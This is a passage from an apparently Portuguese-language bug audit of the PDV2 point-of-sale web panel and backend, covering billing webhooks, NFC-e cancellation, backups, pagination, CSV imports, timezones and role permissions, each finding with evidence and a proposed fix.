- **Cenário de falha:** Vencimento na sexta 04/12. O cliente paga o boleto na sexta à noite; a compensação bancária cai na segunda (ou terça, se houver feriado ou o vencimento for no sábado). O prazo fatal é segunda 00:00: o painel recusa gravações ('Prazo de pagamento encerrado') e os caixas param de vender na abertura da loja até o Asaas confirmar. A UI oferece Boleto como forma de cobrança (web/assets/app.js:3247).
- **Correção:** Calcular a carência em dias úteis ou ampliar para boleto (ex.: vencimento 23:59 + 5 dias corridos); alternativamente conceder liberação provisória curta quando o Asaas reportar pagamento em compensação. Documentar e exibir o prazo real no painel da empresa.

### Cancelamento de NFC-e só pode ser tentado uma vez por documento e o motivo da recusa da SEFAZ é perdido

- **Onde:** `operations/views.py:254` · área `operations-integracoes` · categoria `correctness` · confirmado
- **Evidência:** `enqueue('fiscal.cancel',member.tenant,'fiscal.cancel:'+str(row.pk),{'document_id':...,'reason':reason})`: a chave é fixa por documento. Em services.py:197-207 a resposta de `provider.cancel` é descartada (inclusive `status: erro_cancelamento` + `mensagem_sefaz`, devolvidos com HTTP 200 segundo a documentação da Focus) e, se o GET seguinte não vier 'cancelado', lança `StillPending`; em services.py:228 `fiscal.cancel` nunca é reprocessado (`safe=False`) e vai a `needs_review`. Nova tentativa com a mesma justificativa devolve o job travado; com justificativa diferente dá `JobConflict` 409 (services.py:26-27).
- **Cenário de falha:** Timeout na chamada de cancelamento (ou a Focus devolve `erro_cancelamento` por um motivo corrigível). A nota continua autorizada, a tela mostra só 'Cancelamento ainda não confirmado' e qualquer novo pedido de cancelamento é recusado. O prazo de 30 minutos da NFC-e expira e a venda estornada fica com nota válida e imposto devido.
- **Correção:** Incluir número de tentativa na chave (`fiscal.cancel:<doc>:<n>`), liberando novo pedido quando o job anterior terminou sem `cancelled` e o documento segue `authorized`; persistir `status_sefaz`/`mensagem_sefaz` da resposta do DELETE em `FiscalDocument.error_message`; tratar 422 `already_processed` consultando o estado em vez de ir a revisão. Arquivar também `caminho_xml_cancelamento`.

### Pagamento só entra por webhook: não há ressincronização periódica, e falha não-HTTP na conciliação vai direto para revisão manual

- **Onde:** `operations/services.py:232` · área `operations-integracoes` · categoria `money` · confirmado
- **Evidência:** O worker (operations/worker.py:23-35) só consome a fila; não há tarefa agendada que liste cobranças no Asaas. `recover_subscription` (services.py:128-146), que lista pagamentos, só é acionável a partir de um job `billing.subscribe` em `needs_review` (views.py:272,279-283). Em services.py:232-235 qualquer exceção que não seja ProviderError/StillPending (ex.: `ValueError('Integração não configurada ou desativada')` de `account()`, l.30-32; erro transitório de banco; `requests.RequestException` não coberta por base.py:18) coloca `billing.reconcile` em `needs_review` sem retry. compose.production.yaml:17 deixa `PDV_ASAAS_WEBHOOK_TOKEN` opcional (`:-`), caso em que o webhook responde 401 a tudo (integrations/billing.py:11-13).
- **Cenário de falha:** Token do webhook não configurado/divergente, deploy demorado ou integração Asaas desativada por alguns minutos para trocar a chave: o Asaas acumula falhas e pausa a fila de webhooks, ou os eventos caem em `needs_review`. Clientes que pagaram não têm o período renovado e são bloqueados 72h depois do vencimento, até alguém perceber e clicar job a job.
- **Correção:** Adicionar no worker uma rotina periódica (ex.: a cada 30 min) que, para cada `BillingBinding` ativo com período vencendo ou vencido, chama `list_subscription_payments` e enfileira `billing.reconcile` idempotente por pagamento; tratar exceções não-provedor em kinds idempotentes como retry com backoff; tornar `PDV_ASAAS_WEBHOOK_TOKEN` obrigatório no compose de produção (`:?`) e expor em /ops/health a data do último webhook aceito.

### Fila de tarefas mostra só as 100 mais recentes, sem filtro: jobs em `needs_review` antigos somem da tela e ficam impossíveis de conciliar

- **Onde:** `operations/views.py:139` · área `operations-integracoes` · categoria `ux-bug` · confirmado
- **Evidência:** `rows.order_by('-created_at')[:100]` (l.139-140), sem parâmetro de status nem paginação; a UI da plataforma só oferece ação nas linhas listadas (web/assets/app.js:3167-3178). Cada evento de webhook cria um job (views.py:185) e cobranças do mesmo Asaas que não são do PDV2 viram `needs_review` permanentes ('Cobrança não pertence a uma assinatura cadastrada no PDV2', services.py:74-75).
- **Cenário de falha:** Com algumas dezenas de clientes (4 a 6 eventos por cobrança) ou com a conta Asaas compartilhada com outros produtos, um `billing.subscribe` em revisão — que bloqueia a contratação daquela empresa (views.py:159-160) — sai das 100 linhas em poucos dias. O contador 'jobs_needing_review' acusa pendência, mas não há como abrir o job pela interface.
- **Correção:** Aceitar `?status=`/`?kind=` e paginação por cursor em `/ops/jobs`; listar `needs_review` primeiro; no reconcile, classificar pagamento sem `subscription` ou sem vínculo como `ignored` (estado terminal) em vez de `needs_review`.

### Boleto/Pix por e-mail: o sistema não envia nenhum e-mail e a empresa não vê o link da cobrança no painel

- **Onde:** `cloud/core/views_platform.py:473` · área `operations-integracoes` · categoria `correctness` · confirmado
- **Evidência:** Não há nenhuma chamada a `send_mail`/`EmailMessage` no código (grep em cloud/, operations/, integrations/, shared/ só encontra a configuração em cloud/pdvcloud/settings.py:123-129); as variáveis PDV_EMAIL_* do compose são config morta. `checkout_url` (invoiceUrl do Asaas, gravado em operations/services.py:88) só é exposto no endpoint de plataforma `invoices` (l.472-481, papel platform_billing); não existe endpoint de faturas para a empresa (cloud/core/views_terminal.py:119-137 devolve só status/plano). O e-mail do pagador não é validado (operations/views.py:155) e, se o cliente já existir no Asaas, o e-mail novo não é atualizado (services.py:56). Após contratar, a UI só exibe 'Solicitação criada... Consulte o processamento em Integrações' (web/assets/app.js:3266).
- **Cenário de falha:** Dono contrata por Pix/boleto e digita o e-mail errado, ou a notificação do Asaas cai no spam: ele não tem onde ver o QR Code/boleto dentro do PDV2, não paga, o trial termina e a conta é bloqueada. Hoje o envio depende 100% da notificação automática do próprio Asaas.
- **Correção:** Criar `GET /api/v1/billing/invoices` para owner/admin/finance com status, vencimento e `checkout_url`, e mostrar 'Pagar agora' na tela de assinatura; após o job de assinatura, enfileirar a conciliação do primeiro pagamento para já gravar a fatura; opcionalmente enviar e-mail próprio (SMTP já parametrizado) com o link e lembretes D-3/D0; validar e-mail e atualizar o cadastro do cliente no Asaas quando mudar.

### Lista de snapshots mostra os 30 mais antigos e o repositório cresce sem limite com a configuração padrão (BACKUP_PRUNE=0)

- **Onde:** `operations/views_backup.py:66` · área `operations-integracoes` · categoria `data-loss` · confirmado
- **Evidência:** `return rows[:30]` sobre a saída de `restic snapshots --json` (infra/backup.sh:26), que vem ordenada do mais antigo para o mais novo. compose.production.yaml:89 e infra/production.env.example não ligam o prune (`BACKUP_PRUNE: ${BACKUP_PRUNE:-0}`; backup.sh:42-44). O dump usa `pg_dump --format=custom` (backup.sh:33), que é comprimido e praticamente não deduplica no restic. A validação de restauração só aceita IDs presentes nessa lista (views_backup.py:142).
- **Cenário de falha:** Após 30 horas em produção o painel passa a exibir sempre os mesmos 30 snapshots do primeiro dia; o operador não consegue pedir teste de restauração de um backup recente pela interface. Em paralelo, 24 dumps completos por dia se acumulam no bucket (um banco de 500 MB gera ~12 GB/dia), até estourar cota/custo — e, pelo defeito do `set -e`, a falha por cota cheia também não é sinalizada.
- **Correção:** Ordenar por `time` decrescente antes de cortar (`sorted(rows,key=lambda r:r['time'],reverse=True)[:30]`); ligar `BACKUP_PRUNE=1` por padrão no compose de produção; usar `pg_dump --compress=0` (o restic comprime e deduplica) e rodar `forget --prune` uma vez por dia, não a cada hora.

### Papel Financeiro não consegue abrir Extrato/receber fiado nem registrar devolução, embora a API permita

- **Onde:** `web/assets/app.js:854` · área `painel-js-1` · categoria `correctness` · confirmado
- **Evidência:** `const actionsFor = spec.edit() || (spec.remove && spec.edit()) ? row => { ... if (key === "customers") actions.push({ label: "Extrato" ... }) } : null;` — customers.edit é `can("owner","admin","manager","cashier")`, então para finance actionsFor é null e a coluna de ações não existe. O servidor libera statement e receive para finance (views_customer_credit.py:10-11) e o próprio diálogo checa `can("owner","admin","manager","finance")` (linha 1230). Em saleDetail (linha 1037) o botão de devolução está dentro de `if (canSales() && ...)`, que exclui finance, apesar do `can(..., "finance")` interno (linha 1039) e de sale_return aceitar finance (views_sales.py:68).
- **Cenário de falha:** Funcionária com papel Financeiro abre Clientes para dar baixa no fiado pago: a lista aparece sem nenhum botão; não há como abrir o extrato nem "Receber tudo em aberto". Em Vendas > Detalhes também não vê "Registrar devolução". Ela precisa pedir a um gerente/proprietário.
- **Correção:** Montar actionsFor sempre que houver alguma ação aplicável (Extrato para quem está em READ de crédito), independentemente de spec.edit(); em saleDetail separar a condição da devolução (`can("owner","admin","manager","finance")`) da condição do cancelamento (canSales()).

### Editar grade de variações sempre exige preço: campo monetário opcional vazio vira NaN e bloqueia o envio

- **Onde:** `web/assets/app.js:746` · área `painel-js-1` · categoria `correctness` · confirmado
- **Evidência:** formPayload: `else if (field.type === "money") value = parseMoneyInput(input.value);` (735) retorna NaN para vazio; NaN não cai no `continue` da linha 742 e a linha 746 lança `field.label + ": informe um número válido."`. Em productGroupForm o campo é `{ key: "price_cents", label: detail ? "Preço (novas variações)" : ..., required: !detail }` (1545) e nasce vazio na edição; a linha 1576 (`if (data.price_cents === undefined) delete data.apply_price_to_all`) mostra que o preço deveria ser opcional, e o servidor aceita PATCH sem preço (product_groups.py:176, usa o preço da variação-modelo).
- **Cenário de falha:** Lojista de moda abre "Grades > Editar" só para acrescentar o tamanho GG e clica em "Salvar grade": recebe "Preço (novas variações): informe um número válido." e não consegue salvar sem digitar um preço. Também não consegue apenas renomear a grade ou trocar a categoria.
- **Correção:** Em formPayload, tratar entrada vazia de money/milli opcional como ausente (`if (input.value.trim() === "" && !field.required) continue;`) antes do parse.

### Selects carregam só a primeira página da API (50 categorias, 100 clientes) e ocultam o restante sem aviso

- **Onde:** `web/assets/app.js:671` · área `painel-js-1` · categoria `correctness` · confirmado
- **Evidência:** fieldNode: `records(await api.get(field.source))` com source "/categories" — sem limit nem paginação; a API devolve 50 por padrão ordenado por id (api_common.py:201, views_resources.py:181). panelReturn: `records(await api.get("/customers?limit=100"))` (1070). productGroupsDialog usa `?limit=100` (1531) e transfersDialog `?limit=50` (1871), todos ignorando next_cursor.
- **Cenário de falha:** Mercado com 70 categorias: no cadastro de produto, grade ou abertura de inventário por categoria, 20 categorias (arbitrárias, pois a ordem é por UUID) não aparecem no select e não podem ser escolhidas. Na devolução de uma venda sem cliente com reembolso em "Crédito na loja", loja com mais de 100 clientes não encontra o cliente no select e não consegue lançar o crédito para ele.
- **Correção:** Usar collectPages() (já existe na linha 249) para montar as opções, ordenar por nome, ou trocar por um seletor com busca (?q=) para clientes.

### Parâmetro ?tenant= da URL tem precedência sobre a empresa escolhida no seletor; ao recarregar, o painel volta para a empresa anterior

- **Onde:** `web/assets/app.js:3726` · área `painel-js-1` · categoria `correctness` · confirmado
- **Evidência:** init: `saved=new URLSearchParams(location.search).get("tenant") || localStorage.getItem("pdv2-tenant")`. O handler do seletor (3689-3695) só grava localStorage e não altera a URL. Os links de troca geram `/app/?tenant=<id>` (app.js:413 no menu de perfil e auth.js:134 na escolha de conta).
- **Cenário de falha:** Contador com acesso a duas empresas entra pelo link "/app/?tenant=A", troca para a empresa B no seletor da barra lateral e pressiona F5 (ou o PWA recarrega). O painel reabre na empresa A sem aviso; cadastros, entradas de estoque e títulos lançados em seguida vão para a empresa errada.
- **Correção:** Ao trocar no seletor, remover/atualizar o parâmetro com history.replaceState; no init, depois de aplicar ?tenant=, gravar no localStorage e limpar o parâmetro da URL.

### Encerramento do inventário mostra contagem e sobras/faltas do momento em que a página carregou, não do que foi contado na sessão

- **Onde:** `web/assets/app.js:1805` · área `painel-js-1` · categoria `correctness` · confirmado
- **Evidência:** renderCounting(count) é chamado só em load(); submitCode() apenas faz `prepend(item)` e não atualiza `count`. O botão usa o objeto antigo: `button("Encerrar e ajustar estoque", () => closeForm(count))` (1799) e closeForm exibe `${count.counted_items} de ${count.scope_items}`, `count.totals?.gain_cents` e `loss_cents` (1805-1806). A faixa informativa da linha 1733 também fica parada. Clicar de novo em "Inventário" no menu não recarrega (mesmo hash, sem hashchange).
- **Cenário de falha:** Gerente abre o inventário, bipa 120 itens e clica em "Encerrar e ajustar estoque": o diálogo mostra "Itens contados 0 de 450 · Sobras R$ 0,00 · Faltas R$ 0,00". Ele confirma (ou escolhe "Zerar o estoque" dos não contados) acreditando nesses números; o servidor aplica os ajustes reais, com perdas que ele não viu antes de confirmar.
- **Correção:** Em closeForm, buscar `/inventories/<id>` novamente antes de montar o resumo (e atualizar a faixa/contadores a cada contagem com o retorno do servidor).

### Leitura por câmera no inventário soma o mesmo código de novo a cada ~1,5 s enquanto ele permanece no quadro

- **Onde:** `web/assets/app.js:1770` · área `painel-js-1` · categoria `correctness` · confirmado
- **Evidência:** `if (hit && (hit.rawValue !== last || Date.now() - lastAt > 1500)) { last = hit.rawValue; lastAt = Date.now(); await submitCode(hit.rawValue); }` dentro de um laço de 250 ms; submitCode envia `mode` do formulário, cujo padrão é "add" ("Somar à contagem"), e o servidor soma a cada chamada (views_inventory.py:141).
- **Cenário de falha:** Funcionário aponta o celular para um produto e segura por 5 segundos enquanto confere a prateleira: o mesmo item é contado 3 vezes. No fechamento o sistema gera "sobra" inexistente e ajusta o estoque para cima.
- **Correção:** Só aceitar o mesmo código de novo depois que ele sair do quadro (um ciclo sem detecção) ou exigir toque de confirmação para repetir; alternativamente, usar modo "set" com quantidade digitada na leitura por câmera.

### Inventário: troca rápida de loja mistura respostas (load sem token de requisição) e pode exibir a contagem de outra loja

- **Onde:** `web/assets/app.js:1690` · área `painel-js-1` · categoria `concurrency` · confirmado
- **Evidência:** load() do inventário não incrementa token próprio; só compara `current !== state.renderId` (1695), que é igual para todas as chamadas da mesma página. Há dois awaits em sequência (`/inventories?status=open&shop_id=` e depois `/inventories/<id>`), sem checagem após o segundo, e `shop.select.addEventListener("change", load)` (1822). `return renderIdle()` (1697) sem await deixa rejeições fora do try/catch.
- **Cenário de falha:** Em rede lenta, o usuário seleciona a loja A (com inventário aberto) e logo a loja B (sem inventário). A resposta de B limpa a área e mostra "Nenhum inventário aberto"; em seguida chega o detalhe de A e o formulário de contagem de A é anexado abaixo, com o seletor mostrando B. Os itens bipados na loja B são gravados no inventário da loja A (o POST usa count.id).
- **Correção:** Usar um contador local por load (`const token = ++loadSeq`) e descartar respostas antigas após cada await; `await renderIdle()` dentro do try.

### Diálogo fecha com clique/arraste no fundo ou Escape, sem confirmação, descartando formulários longos

- **Onde:** `web/assets/app.js:360` · área `painel-js-1` · categoria `ux-bug` · confirmado
- **Evidência:** `overlay.addEventListener("click", event => { if (event.target === overlay) closeDialog(); });` e `if (event.key === "Escape") closeDialog();` (352), para qualquer diálogo, inclusive importação de NF-e (mapeamento item a item), transferência e devolução. O evento click dispara no ancestral comum quando o mousedown ocorre dentro do painel e o mouseup fora.
- **Cenário de falha:** Usuário mapeia 40 itens de uma NF-e de compra; ao selecionar o texto de um campo arrastando o mouse e soltando fora da janela (ou ao teclar Esc para fechar uma sugestão de autopreenchimento), o diálogo fecha e todo o mapeamento é perdido, sem aviso.
- **Correção:** Fechar pelo fundo só quando mousedown e mouseup ocorrerem no overlay; para diálogos com formulário alterado, pedir confirmação antes de fechar por Esc/fundo (ou desabilitar o fechamento pelo fundo).

### Devoluções de itens por peso aparecem arredondadas como unidade ("0 UN")

- **Onde:** `web/assets/app.js:1031` · área `painel-js-1` · categoria `correctness` · confirmado
- **Evidência:** `r.items.map(i => `${i.name} × ${quantity(i.quantity_milli)}`)` — quantity() usa unit padrão "UN" com maximumFractionDigits 0 (core.js:119-122) e o serializer de devoluções não envia unit (cloud/core/serializers.py:128-129).
- **Cenário de falha:** Venda de 1,350 kg de queijo com devolução de 0,350 kg: o detalhe da venda lista "Queijo × 0 UN"; devolução de 1,5 kg aparece como "2 UN". Quem confere a devolução vê quantidade errada.
- **Correção:** Enviar unit nos itens de devolução (ou cruzar com `items` da venda por product_id no cliente) e chamar quantity(i.quantity_milli, unit).

### Formas de pagamento próprias aparecem como "other" no detalhe da venda e na conferência de caixa; conferência ignora fiado recebido e estornos em dinheiro

- **Onde:** `web/assets/app.js:1023` · área `painel-js-1` · categoria `correctness` · confirmado
- **Evidência:** saleDetail: `render: row => paymentNames[row.method] || row.method` — a API envia o nome configurado em `name` (serializers.py:123-124) e method "other" para formas próprias (sale_logic.py:107-111); paymentNames não tem "other". cashDetail: `paymentNames[r[0]] || r[0]` (1285). cashDetail (1271-1280) não exibe `credit_received` nem `cash_refunds_cents`, que a API devolve (cash_logic.py:90-91).
- **Cenário de falha:** Loja que aceita vale-refeição: no detalhe da venda e em "Recebido por forma de pagamento" do caixa aparece a linha "other R$ 350,00". Num turno em que clientes pagaram fiado em dinheiro no caixa, o gerente soma abertura + dinheiro + suprimentos − sangrias e não chega no "Esperado em dinheiro", pois o recebimento de fiado não é mostrado.
- **Correção:** Usar `row.name || paymentNames[row.method] || paymentKindNames[row.method]`; no caixa, rotular "other" como "Formas próprias" e acrescentar linhas de "Fiado recebido" (por forma) e "Devoluções em dinheiro".

### Filtros da Visão geral são ignorados em navegadores sem URLSearchParams.size

- **Onde:** `web/assets/app.js:957` · área `painel-js-1` · categoria `correctness` · confirmado
- **Evidência:** `const data = await api.get("/dashboard" + (params.size ? "?" + params : ""));` — `URLSearchParams.prototype.size` só existe a partir de Chrome 113, Firefox 112 e Safari 17; em versões anteriores é undefined e a query string nunca é enviada.
- **Cenário de falha:** Dono abre o painel num iPad/iPhone com iOS 16 e filtra por uma loja ou por período: os indicadores continuam mostrando todas as lojas no mês corrente, sem erro. Ele lê o faturamento da empresa inteira como se fosse da loja filtrada.
- **Correção:** Trocar por `const query = params.toString(); api.get("/dashboard" + (query ? "?" + query : ""))`.

### Indicadores de Produtos contam apenas a página carregada (até 50) e são apresentados como total do catálogo

- **Onde:** `web/assets/app.js:839` · área `painel-js-1` · categoria `correctness` · confirmado
- **Evidência:** `metric("Produtos encontrados", String(rows.length), query ? "Resultado da busca atual" : "Catálogo da empresa")`, e "Produtos ativos", "Vendidos por peso", "Com custo médio" calculados sobre `rows = records(result)` (primeira página de 50). Não são recalculados após "Carregar mais". Além disso, como inativos nunca vêm da API, "Produtos ativos" é sempre igual ao total exibido.
- **Cenário de falha:** Catálogo com 3.000 produtos: a tela mostra "Produtos encontrados 50 · Catálogo da empresa" e "Com custo médio 12", levando o lojista a concluir que a carga do catálogo falhou ou que quase nada tem custo.
- **Correção:** Obter os totais do servidor (endpoint de contagem/resumo) ou rotular como "nesta página" e recalcular a cada página carregada.

### Depois de solicitar a assinatura, a empresa não vê boleto, Pix nem link de pagamento em lugar nenhum do painel

- **Onde:** `web/assets/app.js:3266` · área `painel-js-2` · categoria `money` · confirmado
- **Evidência:** O retorno de /ops/billing/subscribe é só `{job_id,status}` e o painel mostra `toast("Solicitação criada: "+result.status+". Consulte o processamento em Integrações.")` (l.3266). Integrações lista o job com estado cru e sem link (l.3134-3138). O checkout_url (invoiceUrl do Asaas) só é gravado em BillingInvoice e exposto em /platform/invoices, restrito a platform_billing (cloud/core/views_platform.py invoices); não existe rota de cobranças para a empresa em cloud/pdvcloud/urls.py. subscriptionPage (l.2580-2616) não exibe cobranças. O formulário também só oferece Pix e Boleto (l.3250), sem cartão.
- **Cenário de falha:** Cliente em teste clica em Solicitar assinatura, vê "Solicitação criada: queued" e fica sem saber como pagar. Depende exclusivamente do e-mail automático do Asaas; se digitou o e-mail errado ou o e-mail caiu no spam, o teste expira e o caixa bloqueia mesmo com o cliente querendo pagar.
- **Correção:** Criar GET /api/v1/billing/invoices para o tenant (owner/admin) devolvendo status, vencimento e checkout_url; após o job concluir, buscar a primeira cobrança no Asaas (list_subscription_payments) e gravar a BillingInvoice. Em Assinatura, listar cobranças com botão "Pagar" (httpsUrl já existe) e fazer polling do job logo após a solicitação. Incluir CREDIT_CARD/UNDEFINED como forma de cobrança.

### Editar assinatura no admin SaaS reenvia todos os campos: falha com plano inativo e reescreve origem e datas sem o operador ter mudado nada

- **Onde:** `web/assets/app.js:2893` · área `painel-js-2` · categoria `correctness` · confirmado
- **Evidência:** subscriptionEdit monta o payload com plan_id e status sempre presentes e converte as datas para `data+"T12:00:00Z"` (l.2893-2898). O select inclui o plano atual mesmo inativo (`plan.active||plan.id===row.plan?.id`, l.2882), mas o servidor só aceita `Plan.objects.filter(pk=..., active=True)` (cloud/core/views_platform.py:312) e, havendo plan/status/current_period_end no corpo, força `license_source = "manual"`.
- **Cenário de falha:** 1) A plataforma desativa um plano antigo que ainda tem clientes; ao tentar apenas suspender ou prorrogar um desses clientes, o PATCH devolve 404 "Plano não encontrado". 2) Operador abre a assinatura paga de um cliente só para corrigir o fim do teste e salva: license_source passa de subscription para manual (o cliente sai do MRR em /ops/platform/metrics) e o fim do período pago é reescrito para 12:00 UTC do dia.
- **Correção:** Enviar somente os campos que mudaram em relação a `row` (diff antes do PATCH) e não tocar nas datas quando o valor do input for igual ao original; no servidor, aceitar o plano inativo quando ele é o plano atual da assinatura.

### Importação de compra CSV: custo com ponto decimal e 3+ casas vira milhares de reais e corrompe o custo médio

- **Onde:** `web/assets/app.js:2204` · área `painel-js-2` · categoria `data-loss` · confirmado
- **Evidência:** `item.unit_cost_cents = importMoney(cells[costIndex])` (l.2204) usa parseMoneyInput, que sem vírgula só aceita ponto decimal com 1-2 casas e, caso contrário, remove os pontos (l.27-28). Testado em node: "2.3456" → 2345600 centavos; "12.345" → 1234500. A quantidade tem ambiguidade parecida (l.2197-2200): "1.500" vira 1,5. A conferência só mostra "N item(ns) prontos para entrada" (l.2213), sem listar valores.
- **Cenário de falha:** Fornecedor envia planilha exportada de ERP com custo unitário "2.3456" (padrão de NF-e, 4 casas com ponto). O painel aceita, registra entrada com custo de R$ 23.456,00 por unidade, o custo médio do produto explode e os relatórios de margem/lucro ficam errados; não há estorno de entrada no painel.
- **Correção:** No importador, usar um parser próprio: com vírgula → formato brasileiro; só com ponto → tratar o ponto como decimal (qualquer número de casas) e arredondar para centavos. Mostrar na conferência uma tabela com produto, quantidade e custo interpretados antes de habilitar "Registrar compra", com alerta quando o custo divergir muito do custo médio atual.

### Importação CSV aprova na conferência arquivos que o servidor sempre recusa (produto repetido, mais de 200 itens, produto sem controle de estoque)

- **Onde:** `web/assets/app.js:2192` · área `painel-js-2` · categoria `correctness` · confirmado
- **Evidência:** O laço das l.2192-2206 só verifica código conhecido, quantidade e custo, e libera o botão com "itens prontos" (l.2213). O servidor rejeita `not 1 <= len(items) <= 200` (cloud/core/views_stock.py:129), "Produto repetido ou inativo" (l.139) e produtos com stock_controlled falso, com mensagens genéricas e sem indicar a linha.
- **Cenário de falha:** Nota de compra com o mesmo SKU em duas linhas (lotes diferentes) ou com 230 itens: a tela diz "230 item(ns) prontos", o usuário clica em Registrar compra e recebe "Itens da entrada inválidos" ou "Produto repetido ou inativo" sem saber qual linha corrigir; a entrada inteira não é lançada.
- **Correção:** Na leitura do arquivo: somar linhas do mesmo produto com custo ponderado (ou acusar a linha duplicada), validar stock_controlled/unidade inteira para UN e dividir em lotes de 200 com chaves de idempotência derivadas, informando número da linha em cada erro.

### Minha empresa: campos "Série NFC-e" e "Próximo número NFC-e" aparecem sem rótulo, e o CEP corta o último dígito quando digitado com hífen

- **Onde:** `web/assets/app.js:2662` · área `painel-js-2` · categoria `ux-bug` · confirmado
- **Evidência:** `seriesField.append(series)` e `nextNumberField.append(nextNumber)` (l.2662-2663) não anexam seriesLabel/nextNumberLabel, que foram criados mas ficam fora do DOM. O CEP é criado com `plainField("company-address-zip","CEP",company.address_zip,8,"00000000")` (l.2659), ou seja, maxLength 8.
- **Cenário de falha:** O dono vê duas caixas numéricas com "1" e "1" sem nenhuma legenda entre "Emissão fiscal" e "Desconto máximo"; pode alterar a numeração da NFC-e sem saber o que é, e se apagar o valor o salvamento falha com "Série NFC-e inválida" apontando para um campo que não tem nome na tela. Ao digitar o CEP "24900-000" o input para em "24900-00" e o servidor recusa com "Informe o CEP com 8 dígitos".
- **Correção:** `seriesField.append(seriesLabel,series)` e `nextNumberField.append(nextNumberLabel,nextNumber,el("small","","Altere apenas ao migrar de outro sistema."))`; CEP com maxLength 9 e máscara 00000-000 (o submit já remove não dígitos).

### Cabeçalhos de segurança do servidor desligam a câmera do inventário e bloqueiam fotos externas de produto

- **Onde:** `operations/middleware.py:13` · área `painel-js-2` · categoria `correctness` · confirmado
- **Evidência:** O middleware envia `Permissions-Policy: camera=(), microphone=(), geolocation=()` em todas as respostas (l.13) e CSP `img-src 'self' data:` (l.11). O painel chama `navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } })` no inventário (web/assets/app.js:1761) e usa `image.src = row.image_url` (l.148), sendo que o cadastro aceita "https://..." (l.499 e cloud/core/views_resources.py image_url).
- **Cenário de falha:** Em produção, o botão "Usar câmera do celular" do inventário sempre termina em "Câmera indisponível" (NotAllowedError), porque a política proíbe câmera até para a própria origem; o recurso do commit "inventário guiado pelo celular" só funciona digitando. Produto cadastrado com foto em URL externa aparece com imagem quebrada no painel.
- **Correção:** Usar `camera=(self)` para /app/ (mantendo microphone e geolocation vazios) e decidir a política de imagens: ou `img-src 'self' data: https:` ou remover a opção de URL externa do formulário e oferecer upload.

### Administrador pode definir o PIN do proprietário e operar o caixa em nome dele

- **Onde:** `web/assets/app.js:2494` · área `painel-js-2` · categoria `security` · confirmado
- **Evidência:** Na lista de equipe o botão Editar é escondido para a linha do proprietário quando quem está logado não é owner, mas `{label:row.has_pin?"Trocar PIN":"Definir PIN",onClick:()=>userPin(row)}` é oferecido para todas as linhas (l.2494; idem l.2488 e l.2573). O servidor aceita: user_pin exige apenas `roles=MANAGE` (owner/admin) e não compara o papel do alvo (cloud/core/views_users.py:120-136).
- **Cenário de falha:** Um funcionário com papel Administrador troca o PIN do Proprietário em Equipe, entra no terminal escolhendo o login do dono e registra cancelamentos, sangrias e descontos que ficam atribuídos ao dono no histórico; o dono também fica sem conseguir entrar no caixa com o PIN antigo.
- **Correção:** No servidor, em user_pin: se o alvo é owner e o ator não é owner (e não é ele mesmo), responder 403; no painel, esconder o botão de PIN nas mesmas condições em que Editar é escondido.

### Desativar o plano "essential" pelo admin SaaS derruba o cadastro de novas empresas, sem nenhum aviso

- **Onde:** `web/assets/app.js:2837` · área `painel-js-2` · categoria `correctness` · confirmado
- **Evidência:** planForm permite desmarcar "Plano disponível para novas assinaturas" em qualquer plano (planFields l.2837; PATCH na l.2854) e, na edição, o identificador (slug) é removido do formulário (l.2841) e não aparece na tabela (l.2870-2874). O cadastro público depende de `Plan.objects.filter(slug="essential", active=True).first()` e responde 503 "Plano inicial indisponível" se não achar (cloud/core/views_auth.py:143-145).
- **Cenário de falha:** A equipe de cobrança reorganiza os planos, cria "Básico 2027" e desativa o plano antigo de entrada. A partir daí todo visitante que tenta criar conta na landing recebe erro 503 e ninguém percebe, porque o painel não mostra que aquele plano é o plano do teste grátis.
- **Correção:** Mostrar o slug na tabela e no formulário (somente leitura) com selo "plano do teste grátis"; bloquear ou pedir confirmação ao desativar o plano usado no cadastro; melhor ainda, tornar o plano inicial configurável em vez de fixo por slug.

### "Acesso ativo" no formulário de usuário do SaaS desativa a conta inteira do proprietário, não só o acesso administrativo

- **Onde:** `web/assets/app.js:3409` · área `painel-js-2` · categoria `ux-bug` · confirmado
- **Evidência:** platformUserForm sempre envia `payload.active=activeInput.checked` (l.3409) junto com os papéis; o texto do diálogo diz "Você pode conceder, trocar ou remover o acesso administrativo sem apagar o usuário da empresa" (l.3421). No servidor, `row.is_active = values["active"]` (cloud/core/views_platform.py:143) desativa o usuário Django, e require_user recusa usuário inativo em todas as rotas.
- **Cenário de falha:** Superusuário quer tirar o acesso SaaS de um dono de loja que havia sido promovido e desmarca "Acesso ativo". O dono perde o login no painel da própria empresa (401 em tudo) e a loja fica sem proprietário operante até alguém reativar a conta.
- **Correção:** Separar as duas coisas: remover acesso SaaS = desmarcar papéis (já funciona). Renomear o checkbox para "Conta de login ativa (bloqueia também o painel da empresa)" com confirmação, ou ocultá-lo quando o usuário tem vínculo com empresa.

### Datas de promoção são enviadas sem fuso e interpretadas como horário de Brasília; fora desse fuso a vigência desloca a cada edição

- **Onde:** `web/assets/app.js:1941` · área `painel-js-2` · categoria `correctness` · confirmado
- **Evidência:** Ao editar, `localInput(row.starts_at)` converte o ISO para o horário local do navegador (l.1905, l.1941); ao salvar, o valor do datetime-local ("2026-11-20T08:00", sem fuso) vai direto no payload (l.1955-1957). O servidor faz `timezone.make_aware(parsed)` com TIME_ZONE = America/Sao_Paulo (cloud/core/views_promotions.py:66; settings.py).
- **Cenário de falha:** Loja em Manaus, Cuiabá ou Rio Branco agenda promoção das 08:00 às 20:00: ela vale das 07:00 às 19:00 locais (ou 06:00-18:00 no Acre). Cada vez que alguém reabre e salva a promoção sem mexer nas datas, início e fim recuam mais uma ou duas horas.
- **Correção:** Antes do POST/PATCH converter com `new Date(valor).toISOString()` para enviar o instante com fuso; o servidor já aceita datetime com offset.

### Trocar de empresa pelo seletor não atualiza o ?tenant= da URL; após recarregar, o painel volta para a empresa anterior

- **Onde:** `web/assets/app.js:3726` · área `painel-js-2` · categoria `correctness` · confirmado
- **Evidência:** init escolhe a empresa com `new URLSearchParams(location.search).get("tenant") || localStorage.getItem("pdv2-tenant")` (l.3726). O menu de perfil abre `/app/?tenant=<id>` (l.413). O seletor só grava localStorage (l.3695) e não altera a URL.
- **Cenário de falha:** Contador com duas lojas entra pela opção "Loja A" do menu (URL com ?tenant=A), troca para "Loja B" no seletor e lança entradas de estoque. Aperta F5 (ou clica em "Tentar novamente"): o parâmetro da URL vence e o painel volta silenciosamente para a Loja A; os lançamentos seguintes vão para a empresa errada.
